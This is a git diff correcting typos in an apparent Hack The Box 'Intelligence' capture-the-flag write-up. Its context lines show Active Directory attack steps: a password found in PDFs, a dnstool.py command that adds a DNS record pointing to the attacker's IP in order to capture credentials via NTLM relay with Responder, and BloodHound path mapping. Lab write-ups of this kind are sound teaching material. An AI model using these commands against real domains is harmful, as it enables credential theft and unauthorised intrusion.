@@ -304,7 +304,7 @@ And all usernames are valid
 2021/11/27 10:30:12 >  Done! Tested 30 usernames (30 valid) in 1.255 seconds
 ```
 
-Read through all the pdfs using `pdf2txt` tool and somewhere in the text found a passowrd, don't know which pdf contians this text but we got a password.
+Read through all the pdfs using `pdf2txt` tool and somewhere in the text found a password, don't know which pdf contains this text but we got a password.
 ```bash
 ❯ pdf2txt *
 
@@ -400,7 +400,7 @@ Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Grave
 }
 ```
 
-This script is running on Scheduler in every 5min from user "Ted.Graves" and checking inactive hosts from domain contorler's DNS records which start with `web*` using his creds.
+This script is running on Scheduler in every 5min from user "Ted.Graves" and checking inactive hosts from domain controller's DNS records which start with `web*` using his creds.
 
 If we add a DNS record in the domain control with that we can do [NTLM Relay Attack](https://www.qomplx.com/qomplx-knowledge-ntlm-relay-attacks-explained/#what-are-ntlm-relay-attacks).
 
@@ -408,7 +408,7 @@ If we add a DNS record in the domain control with that we can do [NTLM Relay Att
 
 For that we can use [responder](https://github.com/lgandx/Responder); **Source [hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks#responder)**
 
-Adding DNS record in the domain controler with [krbrelayx](https://github.com/dirkjanm/krbrelayx) `dnstool.py` script.
+Adding DNS record in the domain controller with [krbrelayx](https://github.com/dirkjanm/krbrelayx) `dnstool.py` script.
 ```bash
 ❯ python dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -r webduck -d 10.10.14.42 -a add 10.10.10.248
 [-] Connecting to host...
@@ -464,7 +464,7 @@ INFO: Done in 01M 10S
 
 Start BloodHound and load all json file created by bloodhound-python ingestor
 
-And here is the sortest path to the DOMAIN.
+And here is the shortest path to the DOMAIN.
 
 ![](screenshots/sortest-path.png)
 
